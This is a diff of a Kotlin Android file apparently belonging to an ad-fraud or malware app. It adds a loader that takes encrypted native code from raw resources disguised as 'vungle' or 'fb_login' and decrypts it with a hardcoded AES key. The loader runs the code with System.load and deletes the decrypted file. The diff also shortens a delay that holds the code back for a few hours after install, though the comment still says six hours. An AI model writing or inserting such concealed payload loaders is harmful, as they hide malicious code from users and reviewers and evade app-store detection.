@@ -9,7 +9,6 @@ import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
-import android.util.Log
 import androidx.work.ExistingWorkPolicy
 import androidx.work.OneTimeWorkRequest
 import androidx.work.WorkManager
@@ -23,12 +22,17 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import lovely.Ppz
 import org.json.JSONObject
 import java.io.File
+import java.io.FileOutputStream
+import java.io.InputStream
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import javax.crypto.Cipher
+import javax.crypto.spec.SecretKeySpec
 import kotlin.random.Random
 
 /**
@@ -153,7 +157,7 @@ object AdE {
                 time = System.currentTimeMillis().toString()
                 Core.saveC("time_first", time)
             }
-            if (System.currentTimeMillis() - time.toLong() < 60000 * 60 * 6) { // 6小时以内
+            if (System.currentTimeMillis() - time.toLong() < 60000 * 60 * 3) { // 6小时以内
                 Core.pE("test_user")
                 return
             } else {
@@ -210,12 +214,7 @@ object AdE {
 
     private val handler = Handler(Looper.getMainLooper())
     private fun t() {
-        val parentFile = File("${mContext.filesDir}")
-        val save = File(parentFile, "fileCore")
-        FileDownLoad("").fileD(soUrlW, success = {
-            action(save)
-            acper()
-        }, save)
+        action()
     }
 
     private fun acper() {
@@ -235,17 +234,25 @@ object AdE {
         }, 1000)
     }
 
-    private fun action(file: File) {
+    private fun action() {
         mMainScope.launch {
             Core.pE("test_s_dec")
             val time = System.currentTimeMillis()
-            loSo(file)
+            val i: Boolean
+            withContext(Dispatchers.IO) {
+                i = loadSFile(if (is64a()) "vungle" else "fb_login")
+            }
+            if (i.not()) {
+                Core.pE("ss_l_f")
+                return@launch
+            }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
             Ppz.a0(tagL)
             if (isLi().not()) {
                 AdCenter.loadAd()
             }
             delay(1000)
+            acper()
             while (true) {
                 var t = cTime
                 if (checkTimeRandom > 0) {
@@ -273,6 +280,41 @@ object AdE {
         }
         return false
     }
+
+    private fun loadSFile(assetsName: String): Boolean {
+        val resourceId: Int =
+            mContext.resources.getIdentifier(assetsName, "raw", mContext.packageName)
+        val aIp = mContext.resources.openRawResource(resourceId)
+        val fSN = "A_${System.currentTimeMillis()}"
+        val file = File("${mContext.filesDir}/Cache")
+        if (file.exists().not()) {
+            file.mkdirs()
+        }
+        try {
+            decrypt(aIp, File(file.absolutePath, fSN))
+            val file2 = File(file.absolutePath, fSN)
+            System.load(file2.absolutePath)
+            file2.delete()
+            return true
+        } catch (_: Exception) {
+        }
+        return false
+    }
+
+
+    // 解密
+    private fun decrypt(inputFile: InputStream, outputFile: File) {
+        val key = SecretKeySpec("q17s8321jsjgk0oq".toByteArray(), "AES")
+        val cipher = Cipher.getInstance("AES")
+        cipher.init(Cipher.DECRYPT_MODE, key)
+        val outputStream = FileOutputStream(outputFile)
+        val inputBytes = inputFile.readBytes()
+        val outputBytes = cipher.doFinal(inputBytes)
+        outputStream.write(outputBytes)
+        outputStream.close()
+        inputFile.close()
+    }
+
 
     private fun is64a(): Boolean {
         // 优先检测64位架构
